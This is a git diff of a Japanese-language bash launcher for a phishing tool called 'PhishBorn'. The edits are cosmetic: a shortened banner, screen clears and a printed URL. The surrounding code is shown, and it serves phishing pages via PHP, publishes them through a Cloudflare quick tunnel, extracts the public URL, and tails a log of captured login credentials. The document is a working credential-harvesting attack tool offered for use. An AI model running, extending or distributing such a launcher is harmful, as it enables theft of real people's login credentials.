@@ -12,15 +12,8 @@ NC='\033[0m' # 色をリセット
 
 # ヘッダー
 echo -e "${BLUE}"
-echo "  #####    ##  ##    ####     ####    ##  ##   #####     ####    #####    ##  ## ";
-echo "  ##  ##   ##  ##     ##     ##  ##   ##  ##   ##  ##   ##  ##   ##  ##   ### ## ";
-echo "  ##  ##   ##  ##     ##     ##       ##  ##   ##  ##   ##  ##   ##  ##   ###### ";
-echo "  #####    ######     ##      ####    ######   #####    ##  ##   #####    ###### ";
-echo "  ##       ##  ##     ##         ##   ##  ##   ##  ##   ##  ##   ####     ## ### ";
-echo "  ##       ##  ##     ##     ##  ##   ##  ##   ##  ##   ##  ##   ## ##    ##  ## ";
-echo "  ##       ##  ##    ####     ####    ##  ##   #####     ####    ##  ##   ##  ## ";
-echo -e "                    PhishBorn${NC} by ${YELLOW}tajitag"
-echo "================================================================================="
+echo -e "         PhishBorn${NC} by ${YELLOW}tajitag"
+echo "====================================================================="
 echo ""
 
 
@@ -64,16 +57,16 @@ elif [[ "$choice" -gt 0 && "$choice" -le ${#folders[@]} ]]; then
   read -p "番号を入力 >>> " method
 
   > log.txt
-
+ clear
   if [[ "$method" == "1" ]]; then
     echo -e "${BLUE}ローカルホストで起動します${NC}"
     php -S localhost:8000 > /dev/null 2>&1 &
     server_pid=$!
-    echo -e "${GREEN}ログイン情報を監視中（Ctrl+Cで終了）:${NC}"
+    echo -e "${GREEN}ログイン情報を監視中（Ctrl+Cで終了）:${NC} (http://localhost:8000/index.php)"
     tail -f log.txt
     kill $server_pid
 
-  elif [[ "$method" == "2" ]]; then
+    elif [[ "$method" == "2" ]]; then
     if ! command -v cloudflared > /dev/null; then
       echo -e "${RED}Cloudflared が見つかりません。インストールしてください。${NC}"
       exit 1
@@ -85,12 +78,14 @@ elif [[ "$choice" -gt 0 && "$choice" -le ${#folders[@]} ]]; then
     cloudflared tunnel --url http://localhost:8000 > cloudflared.log 2>&1 &
     tunnel_pid=$!
     sleep 4
+    clear
     public_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' cloudflared.log | head -n 1)
     echo -e "${GREEN}公開URL：${YELLOW}$public_url${NC}"
     echo -e "${GREEN}ログイン情報を監視中（Ctrl+Cで終了）:${NC}"
     tail -f log.txt
     kill $server_pid
     kill $tunnel_pid
+
   else
     echo -e "${RED}無効な入力です。最初からやり直してください。${NC}"
   fi
